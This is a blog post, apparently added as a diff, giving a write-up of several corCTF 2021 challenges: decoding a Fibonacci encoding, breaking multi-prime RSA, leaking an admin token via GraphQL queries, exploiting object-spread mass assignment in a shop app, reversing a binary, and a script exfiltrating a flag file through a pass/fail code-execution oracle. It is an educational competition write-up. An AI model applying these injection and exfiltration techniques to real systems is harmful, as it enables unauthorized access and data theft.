@@ -1,0 +1,695 @@
+---
+layout: post
+title:  "corCTF 2021 Writeup"
+tags: CTF
+---
+
+This competition was hosted by a collegiate team named Crusaders of Rust. The
+event took place over a couple of days and featured a huge amount of challenges.
+I really wish there was a bit more time for me to experience them all during the
+event but it is what it is.
+
+This competition ended up being insanely tough for me. The few challenges I did
+complete were really well made and I definitely recommend this event if they host it again.
+You can find the competition site [here](https://2021.cor.team/)
+
+Anyway, here are the writeups for some of the challenges I solved.
+
+
+## **Crypto**
+
+### **fibinary**
+
+```
+Warmup your crypto skills with the superior number system!
+```
+This crypto challenge contains some code and the resulting output. First the code
+
+```
+fib = [1, 1]
+for i in range(2, 11):
+	fib.append(fib[i - 1] + fib[i - 2])
+
+def c2f(c):
+	n = ord(c)
+	b = ''
+	for i in range(10, -1, -1):
+		if n >= fib[i]:
+			n -= fib[i]
+			b += '1'
+		else:
+			b += '0'
+	return b
+
+flag = open('flag.txt', 'r').read()
+enc = ''
+for c in flag:
+	enc += c2f(c) + ' '
+with open('flag.enc', 'w') as f:
+	f.write(enc.strip())
+```
+
+Although solving this challenge didn't really require a whole lot of
+knowing what this code did, here are the very basics.
+
+- A Fibonacci sequence is created
+- Each letter of the flag is encoded into a binary string using the Fibonacci sequence
+- The encoded flag is output to a file
+
+Since this is just an encoding and not encrypted, we can reverse the
+process very easily without knowing **exactly** what is happening under
+the hood.
+
+I decided the easiest way to solve this was to make a dictionary of
+each character's encoding. To do this I input a string of all printable
+ascii values into the script. Here is the adjusted script I created
+to solve this challenge.
+
+```
+fib = [1, 1]
+for i in range(2, 11):
+	fib.append(fib[i - 1] + fib[i - 2])
+
+def c2f(c):
+    n = ord(c)
+    b = ''
+    for i in range(10, -1, -1):
+	    if n >= fib[i]:
+		    n -= fib[i]
+		    b += '1'
+	    else:
+		    b += '0'
+    return b
+
+flag = open('dictionary.txt', 'r').read()
+enc = ''
+encodings = dict()
+for c in flag:
+    b = c2f(c)
+    encodings[b] = c
+    enc += b + ' '
+
+with open('flag.enc', 'r') as f:
+    text = f.read()
+
+result = ""
+codes = text.split(" ")
+for code in codes:
+    if code in encodings.keys():
+        result += encodings[code]
+
+print(result)
+```
+
+After I had a dictionary, I could decode each character by searching
+for its decoded value in the dictionary. Finally, concatenating all
+the resulting decoded characters gives us the flag.
+
+
+### **4096**
+
+```
+I heard 4096 bit RSA is secure, so I encrypted the flag with it.
+```
+
+The second crypto challenge includes another script and its output but
+this time there is some RSA happening.
+
+```
+from Crypto.Util.number import getPrime, bytes_to_long
+from private import flag
+
+def prod(lst):
+	ret = 1
+	for num in lst:
+		ret *= num
+	return ret
+
+m = bytes_to_long(flag)
+primes = [getPrime(32) for _ in range(128)]
+n = prod(primes)
+e = 65537
+print(n)
+print(pow(m, e, n))
+```
+
+The script is fairly short but does a number of operations. The script
+looks like typical RSA calculations, however, the 4096-bit modulus
+is created by multiplying 128 32-bit primes. This is where the weakness
+lies. Since the modulus is made by so many small primes, it's fairly
+easy to factor n and retrieve all the primes.
+
+To keep things simple, I used a combination of sites to factor n.
+They can be found [here](https://www.alpertron.com.ar/ECM.HTM) and [here](http://factordb.com/).
+Then, mathematically, finding the product of every prime - 1 will give us phi(n) and we can
+decrypt the flag. Again, to save some time (and embarrassment) I found
+a script online to decrypt for me.
+
+```
+multi_solver.py
+
+# Solves multi prime rsa given n, e, and c. Need to factor n into primes first (recommend yafu)
+# Reference https://crypto.stackexchange.com/questions/31109/rsa-enc-decryption-with-multiple-prime-modulus-using-crt
+# From https://github.com/diogoaj/ctf-writeups/tree/master/2018/Timisoara/crypto/NotYourAverageRSA
+```
+
+For convenience the full script can be found [here](https://gist.github.com/jackz314/09cf253d3451f169c2dbb6bbfed73782).
+I made a few adjustments to the script to include my own list of primes, n, e, and
+c. Then the script immediately spat out the flag.
+
+## **Web**
+
+### **devme**
+
+```
+an ex-google, ex-facebook tech lead recommended me this book!
+```
+
+For this challenge, we are given only a link to a site. So let's check it out.
+
+![DevMe](/assets/corCTF/devWeb.png)
+
+![DevMe2](/assets/corCTF/devWeb2.png)
+
+Overall, there is not a lot going on in this site. The source code and everything else
+don't reveal any other pages. However, we do have a single area to input some data
+so let's try it out.
+
+At first glance it seems like nothing special happened. However, behind the scenes When
+we submit an email it makes a query to graphql.
+
+![Graphql](/assets/corCTF/email.png)
+
+Graphql is sort of like an SQL for an api. It was developed by Facebook which, given the flavour
+text for this challenge, probably means this is the way in. After a bit of research into query format,
+I tried to modify the request to graphql to see if I could get some info.
+
+![Query Graphql](/assets/corCTF/graphqlquery.png)
+
+I used [this repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
+and [this site](https://book.hacktricks.xyz/pentesting/pentesting-web/graphql)
+to get a list of basic statements to enumerate the database. Here we can see the database has a few
+types, most importantly, users and flag. Let's try to query flag and see what happens.
+
+![Query Flag](/assets/corCTF/graphqlflag.png)
+
+An error spits out saying that we need an argument token. Further inspection into flag revealed
+that it was a function much like the "createUser" one used when we submitted our email.
+Next I noticed that the users type had a field called token so I made a query to see if
+I could find one there.
+
+![Users Query](/assets/corCTF/graphqluser.png)
+
+Ah ha! The first user listed is named admin and has a token attached. Next I tried to
+add the token to the previous flag query but to no avail. To follow up, I used burp to
+modify the "createUser" query to make sure I was following the rules of graphql.
+
+![Final Query](/assets/corCTF/devWebQuery.png)
+
+This query promptly spat out the flag and the challenge was complete.
+
+### **buyme**
+
+```
+I made a new site to buy flags! But no hoarding, okay :<
+```
+
+This web challenge includes some source code as well as the website.
+First a quick look at the website.
+
+![Buyme](/assets/corCTF/buyme.png)
+
+The site has a couple of pages with a few features. Basically, users
+register, log in, and buy flags from a list of flags.
+
+![Flags](/assets/corCTF/flags.png)
+
+Here is the wide selection of different flags. For the purposes of this
+challenge, it seems we want to get our hands on the extravagant corCTF
+flag. I did some playing around and captured some of the requests with
+burp.
+
+![Buy Request](/assets/corCTF/buyflag.png)
+
+Here is the request to buy a flag. All users start out with $100 so
+I wasn't able to buy the corCTF flag but I did get an Indian one.
+I needed a bit more info so the source code is up next.
+
+```
+api.js
+
+router.post("/register", async (req, res) => {
+    let { user, pass } = req.body;
+    if(!user || !pass) {
+        return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
+    }
+    if(db.users.has(user)) {
+        return res.redirect("/?error=" + encodeURIComponent("A user already exists with that username"));
+    }
+    db.users.set(user, {
+        user,
+        flags: [],
+        money: 100,
+        pass: await bcrypt.hash(pass, 12)
+    });
+    res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
+    res.redirect("/");
+});
+
+[...]
+
+router.post("/buy", requiresLogin, async (req, res) => {
+    if(!req.body.flag) {
+        return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
+    }
+
+    try {
+        db.buyFlag({ user: req.user, ...req.body });
+    }
+    catch(err) {
+        return res.redirect("/flags?error=" + encodeURIComponent(err.message));
+    }
+
+    res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
+});
+```
+
+I'll keep things brief by examining the important bits of the source.
+In this segment the various api calls are performed. The registration
+one looked enticing at first, but I couldn't really control anything
+beyond user and pass. The buy call however, is a different story.
+
+```
+router.post("/buy", requiresLogin, async (req, res) => {
+    if(!req.body.flag) {
+        return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
+    }
+
+    try {
+        db.buyFlag({ user: req.user, ...req.body });
+    }
+    catch(err) {
+        return res.redirect("/flags?error=" + encodeURIComponent(err.message));
+    }
+
+    res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
+});
+```
+
+Here the app performs a few steps
+
+1. The app checks if the user is logged in
+2. It checks if the request had a flag field in the payload
+3. It calls db.buyFlag to attempt to buy the flag
+4. It spits out any errors if things go wrong
+5. If everything went smoothly it redirects the user and tells them the flag was bought
+
+The call to the db.buyflag() requires a bit more investigation.
+
+```
+db.js
+
+
+const users = new Map();
+
+const buyFlag = ({ flag, user }) => {
+    if(!flags.has(flag)) {
+        throw new Error("Unknown flag");
+    }
+    if(user.money < flags.get(flag).price) {
+        throw new Error("Not enough money");
+    }
+
+    user.money -= flags.get(flag).price;
+    user.flags.push(flag);
+    users.set(user.user, user);
+};
+```
+
+This segment is from db.js and performs some adjustments when users buy
+flags, as well as some basic flag name checks. Weirdly, the function seems to
+overwrite whatever values are at users[user]. So if we could send more than just
+a flag value to it, we could overwrite our user with whatever values we want.
+
+Fortunately, it is possible to send more values to buyFlag. This is because of
+some insecure destructuring found in the following code.
+
+```
+db.buyFlag({ user: req.user, ...req.body });
+```
+
+Object destructuring in Javascript will try to unpack values in arrays and objects
+into distinct variables. This means we can send a whole user object of our own within
+the request body and it will be unpacked for the buyFlag function. To do this I
+modified the buy request in burp.
+
+![New Buy Request](/assets/corCTF/buyuser.png)
+
+First I tried to see what would happen if I just sent a user field along with a flag one.
+The result sort of confirms that we have some power here. The returned error shows that
+the buyFlag function gets caught trying to push a the new flag into a user object that
+has no flags list. After a bit of experimenting, I came up with this final request.
+
+![Final Buy Request](/assets/corCTF/flagsjson.png)
+
+Here I send a full user object which includes a flag list already containing the corCTF flag.
+I also set user.money to $100 so I could buy a new flag (this time a Chinese flag).
+The response to this request redirects to the home page which notices we have the corCTF flag
+and prints out the flag.
+
+## **Rev**
+
+### **babyrev**
+
+```
+well uh... this is what you get when you make your web guy make a rev
+chall
+```
+
+This is my first ever successful rev challenge completed! Anyway, here's how
+it went down. The challenge starts off with a single binary we have to reverse
+engineer to figure out the flag. To start off I used strings to see if there
+was any simple solution.
+
+![Strings](/assets/corCTF/strings.png)
+
+While there isn't an obvious flag, there were some minor hints here. First, a
+bunch of function names that seem to suggest the program uses a Caesar shift cipher.
+Second, "uEbSuFRC_uPRu" a weird string of characters to say the least, could be a flag that was encoded.
+Next I booted up the binary to see what it did.
+
+![Binary](/assets/corCTF/output.png)
+
+It didn't really give any hints to what it was doing behind the scenes. Next I
+booted up ghidra and tried to decompile the binary.
+
+![Ghidra](/assets/corCTF/ghidra.png)
+
+Looking at main() we can see there is a lot going on. I'll go through it step-by-step.
+You can find a copy of the decompiled code [here](). I added some comments to the code to help with the explanation.
+
+```
+local_20 = *(long *)(in_FS_OFFSET + 0x28);
+fgets(local_e8,0x40,stdin);
+sVar3 = strcspn(local_e8,"\n");
+local_e8[sVar3] = '\0';
+sVar3 = strlen(local_e8);
+local_f0 = 7;
+iVar2 = strncmp("corctf{",local_e8,7);
+```
+
+This first segment takes in some user input, saves the length of the input,
+and compares the first 7 characters of the input to "corctf{"
+
+```
+//is inp = "corctf{*" and is inp[len-1] = '}' and is len(inp) = 28?
+if (((iVar2 == 0) && (local_e8[sVar3 - 1] == '}')) && (sVar3 == 0x1c)) {
+
+  //copy 20 bytes of inp+7 into local_a8
+  memcpy(local_a8,local_e8 + local_f0,0x1b - local_f0);
+  auStack141[-local_f0] = 0;
+
+[...]
+else {
+  puts("rev is hard i guess...");
+  uVar4 = 1;
+}
+```
+
+Next, the program checks if the input's first 7 letters were "corctf{" and if the
+character at len(input)-1 is '}' and if the length of the input is 28 (0x1c).
+If it is it scraps the first 7 bytes of input and copies the next 20 into a new variable.
+Otherwise, it prints out "rev is hard i guess..".
+
+```
+ //index = 0
+ local_100 = 0;
+
+ //search for prime number
+ while( true ) {
+   sVar3 = strlen(local_a8);
+   if (sVar3 <= (ulong)(long)local_100) break;
+   local_fc = local_100 << 2;
+   while( true ) {
+     //Check if value is prime
+     cVar1 = is_prime(local_fc);
+     if (cVar1 == '\x01') break;
+     local_fc = local_fc + 1;
+   }
+
+   //call rot_n(input_character[index], some_prime)
+   cVar1 = rot_n((int)local_a8[local_100],local_fc);
+   //Set local_68[index] to the result of rot_n
+   local_68[local_100] = cVar1;
+   //Increment index
+   local_100 = local_100 + 1;
+ }
+```
+
+Continuing on from inside the if statement. The next thing it does is it search for
+primes and use those primes as a "key" for rot_n. We can reconstruct the list of primes
+by following along.
+
+1. local_fc is set to the index (local_100) bit shifted left by 2
+2. local_fc is checked to see if it is a prime >= 2
+3. If it is prime, use it in rot_n, else increment local_fc and repeat step 2
+
+This process continues for all 20 characters of local_a8 and gives us a list of primes
+as follows
+
+```
+[2, 5, 11, 13, 17, 23, 29, 29, 37, 37, 41, 47, 53, 53, 59, 61, 67, 71, 73, 79]
+```
+
+Each prime is used as a "key" for the Caesar shift cipher rot_n. However, the rot_n
+function requires a bit of inspection.
+
+```
+char rot_n(char param_1,int param_2)
+{
+  char *pcVar1;
+
+  pcVar1 = strchr(ASCII_UPPER,(int)param_1);
+  if (pcVar1 == (char *)0x0) {
+    pcVar1 = strchr(ASCII_LOWER,(int)param_1);
+    if (pcVar1 != (char *)0x0) {
+      param_1 = ASCII_LOWER[(param_1 + -0x61 + param_2) % 0x1a];
+    }
+  }
+  else {
+    param_1 = ASCII_UPPER[(param_1 + -0x41 + param_2) % 0x1a];
+  }
+  return param_1;
+}
+```
+
+Here we can see that rot_n only shifts letters within their respective alphabet.
+This means lowercase letters remain lowercase and uppercase remain uppercase. However,
+special characters **do not** get shifted at all. As a result, this rot_n function is more
+like a rot_26 function. Let's move on to the final step of the code.
+
+```
+  sVar3 = strlen(local_68);
+  local_68[sVar3 + 1] = '\0';
+
+  //encrypt 20 bytes of check by xoring each byte with 42
+  memfrob(check,0x14);
+  iVar2 = strcmp(local_68,check);
+
+  //if check = local_68 then print correct!
+  if (iVar2 == 0) {
+    puts("correct!");
+    uVar4 = 0;
+  }
+
+  //else print rev is hard i guess...
+  else {
+    puts("rev is hard i guess...");
+    uVar4 = 1;
+  }
+}
+```
+
+First, we encounter a weird function, memfrob(check, 0x14). memfrob is a weird name but
+it's fairly simple, it xor's x bytes (in this case 0x14) of the first argument (in this case check)
+with 42. We can look up check in the program's memory and find its value "_\@Z.uEbSuFRC_uPRu_\O".
+Then XOR it with 42 again to find "ujp?_oHy_lxiu_zx_uve" which looks a lot like what we are looking for.
+
+Next the code compares "ujp?_oHy_lxiu_zx_uve" (the result of memfrob) with our the result of the
+previous segment. If they are the same, then the program prints out "correct", if not then
+it prints out "rev is hard i guess...".
+
+From here finding the flag is simple. We take "ujp?_oHy_lxiu_zx_uve" and reverse the rot_n on it
+using the list of primes we got earlier. To reverse it we simply shift each letter (non-special character)
+backwards by its corresponding prime number.
+
+```
+Ciphertext    rot_n       Plaintext
+
+u             rot -2      s
+j             rot -5      e
+p             rot -11     e
+?             rot -13     ?
+_             rot -17     _
+o             rot -23     r
+H             rot -29     E
+y             rot -29     v
+_             rot -37     _
+l             rot -37     a
+x             rot -41     i
+i             rot -47     n
+u             rot -53     t
+_             rot -53     _
+z             rot -59     s
+x             rot -61     o
+_             rot -67     _
+u             rot -71     b
+v             rot -73     a
+e             rot -79     d
+```
+
+It's important to remember that special characters aren't shifted but they do have
+their own prime. Anyway, putting this all together we can conclude that
+corctf{see?_rEv_aint_so_bad} is our flag and the challenge is complete.
+
+## **Misc**
+
+### **yeetcode**
+
+```
+Brush up on your coding skills and ace your next interview with
+YeetCode! Flag is at ./flag.txt
+```
+
+This is one of the few misc challenges and it acts mostly like a web
+challenge. We are given a site and some source code. Here is the site.
+
+![Yeet](/assets/corCTF/yeet2.png)
+
+The basic premise of the site is to teach the user to code. The site
+includes an incredibly basic problem for the user to code a solution
+to. The user can input some code and the server will run it and check
+the output to see if it solves the problem of a+b=?.
+
+![YeetCode](/assets/corCTF/yeet3.png)
+
+Here is my solution to the problem. Next I submitted my code.
+
+![Pass](/assets/corCTF/yeetsuccess.png)
+
+As you can see, I got passed with flying colours. But, what happens
+if my code doesn't pass? Let's try it out.
+
+![Fail](/assets/corCTF/yeetfail.png)
+
+Unfortunately, in these tests a+b != a. Going back to trying to get the
+flag, next I looked through the source code to try to find somewhere
+that prints more output than pass or fail. However, this was to no
+avail.
+
+Eventually, I thought maybe I should treat this like a blind SQL
+injection and get the flag through a series of pass/fail tests.
+Here is the adjusted code I submitted to the site to test this theory.
+
+```
+def f(a,b):
+  with open("flag.txt", "r") as f:
+    for line in f:
+      flag = line
+
+  test = list(flag)
+  if test[0] is 'c':
+    return a+b
+  else:
+    return 0
+```
+
+So basically, this code checks to see if the first letter of the flag is 'c'
+and if it is the site will print out a passing score. Otherwise, the site
+prints out a failing score.
+
+![Yeet Test](/assets/corCTF/yeettest.png)
+
+Nice! Because the flag has to start with "corctf{" we can confirm this
+method probably works. I first decided to check the length of the flag using
+the same method and the result was 33. Next I made a script to automate the
+whole deal.
+
+```
+import requests, time
+
+url = 'https://yeetcode.be.ax/yeetyeet'
+flag_len = 33
+
+f = open("query.py", "r")
+code = f.read()
+
+def query(index, s):
+  ret = None
+  while ret is None:
+    time.sleep(0.5)
+    dat = code.format(index, s)
+    res = requests.post(url, data=dat).text
+    if '"f":0' in res: ret = True
+    if '"f":10' in res: ret = False
+  return ret
+
+def binsearch(index, lo, hi):
+    while lo < hi:
+        mid = (hi+lo) // 2
+        if query(index, "> '{}'".format(chr(mid))):
+            lo = mid+1
+        else:
+            hi = mid
+    return lo
+
+def solve():
+    flag = list()
+    for i in range(flag_len):
+        print(i)
+        val = binsearch(i, 33, 126)
+        if i == 7:
+            print(chr(val))
+        flag.append(chr(val))
+    return flag
+
+print("".join(solve()))
+```
+
+The code relies on what we learned earlier and uses binary search to quickly
+find the correct letters of the flag. A small thing to note is to automate this
+I use format strings to adjust values in the previous code (found in query.py).
+
+```
+def f(a,b):
+  with open("flag.txt", "r") as f:
+    for line in f:
+      flag = line
+  test = list(flag)
+  if test[{}] {}:
+    return a+b
+  else:
+    return 0
+```
+
+Here is what the query string looks like before formatting. Anyway, after a
+handful of seconds the flag was printed out by my script.
+
+## **Conclusion**
+
+This was definitely the toughest competition I've done. However, it also had some
+of the most well-made and well-thought-out challenges I've experienced. Again, I am
+very curious to see writeups on all of the crypto challenges to see what sort of math
+I needed to do to solve them.
+
+Thank you to all the people who created challenges and supported this event, you all
+did an amazing job.
+
+## **Lessons learned**
+
+1. Reversing an Encoding
+2. Multiple Prime RSA Basics and Weaknesses
+3. Graphql Injection
+4. Exploiting Insecure JavaScript Destructuring
+5. Basic Reverse Engineering
+6. Binary Search Usage in Data Exfiltration
